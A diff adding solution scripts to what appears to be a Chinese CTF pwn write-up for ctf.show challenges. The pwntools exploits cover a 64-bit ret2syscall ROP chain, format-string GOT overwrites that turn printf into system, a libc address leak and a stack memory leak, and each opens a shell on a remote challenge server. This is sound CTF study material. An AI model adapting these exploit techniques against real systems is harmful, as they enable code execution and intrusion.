@@ -436,6 +436,45 @@ p.sendline(payload)
 p.interactive()
 ```
 
+## 78 ret2syscall(64)
+
+```python
+from pwn import *
+from LibcSearcher import LibcSearcher
+from ctypes import *
+context(os='linux', arch='amd64',log_level = 'debug')
+context.terminal = 'wt.exe -d . wsl.exe -d Ubuntu'.split()
+elf = ELF("./pwn")
+#libc = ELF("./libc.so.6")
+#p = process('./pwn')
+p = remote('pwn.challenge.ctf.show',28283)
+#gdb.attach(p)
+
+pop_rax = 0x000000000046b9f8
+pop_rdi = 0x00000000004016c3
+pop_rdx_rsi = 0x00000000004377f9
+ret = 0x000000000045bac5
+buf = 0x6c2000
+
+payload = b'a'*0x50+b'b'*0x8
+# read(0,buf,0x10)
+payload+=p64(pop_rax)+p64(0)
+payload+=p64(pop_rdx_rsi)+p64(0x10)+p64(buf)
+payload+=p64(pop_rdi)+p64(0)
+payload+=p64(ret)
+# syscall(0,buf,0)
+payload+=p64(pop_rax)+p64(0x3b)
+payload+=p64(pop_rdx_rsi)+p64(0)*2
+payload+=p64(pop_rdi)+p64(buf)
+payload+=p64(ret)
+
+p.sendline(payload)
+p.sendline(b'/bin/sh\x00')
+p.interactive()
+```
+
+
+
 ## 79 ret2reg(32位) call rax或jmp reg挟持走向
 
 #### 栈可执行
@@ -866,5 +905,65 @@ one_gadget = libc_base + 0x10a2fc
 io.send(p64(one_gadget))
 #io.send(payload)
 io.interactive()
+```
+
+## 94 fmtstr实现任意地址写
+
+```python
+from pwn import *
+context.log_level = 'debug'
+#p = process('./pwn')
+p = remote('pwn.challenge.ctf.show',28286)
+elf = ELF('./pwn')
+printf_got=elf.got['printf']
+sys_got = elf.plt['system']
+
+payload = fmtstr_payload(6,{printf_got:sys_got})
+p.sendline(payload)
+p.recv()
+p.sendline(b'/bin/sh\x00')
+p.sendline(b'cat ctfshow_flag')
+p.interactive()
+```
+
+## 95 格式化字符串实现任意位置读
+
+```python
+from pwn import *
+from LibcSearcher import *
+context.log_level = 'debug'
+#io = process('./pwn')
+io = remote('pwn.challenge.ctf.show',28159)
+elf = ELF('./pwn')
+printf_got = elf.got['printf']
+payload = p32(printf_got) + b'%6$s'
+io.send(payload)
+printf = u32(io.recvuntil('\xf7')[-4:])
+libc = LibcSearcher('printf',printf)
+libc_base = printf - libc.dump('printf')
+system = libc_base + libc.dump('system')
+log.info("libc_base:"+hex(libc_base))
+log.info("system ===> %s" % hex(system))
+payload = fmtstr_payload(6,{printf_got:system})
+io.send(payload)
+io.send(b'/bin/sh\x00')
+io.recv()
+io.interactive()
+```
+
+## 96 格式化字符串泄露内存中的字符
+
+```python
+from pwn import *
+p = remote('pwn.challenge.ctf.show',28253)
+flag = b''
+q = 6
+for i in range(q,q+12):
+    payload = '%{}$p'.format(str(i))
+    p.sendlineafter(b'$ ',payload)
+    aim = unhex(p.recvuntil(b'\n',drop = True).replace(b'0x',b''))
+    flag+=aim[::-1]
+
+print(flag)
 ```
 
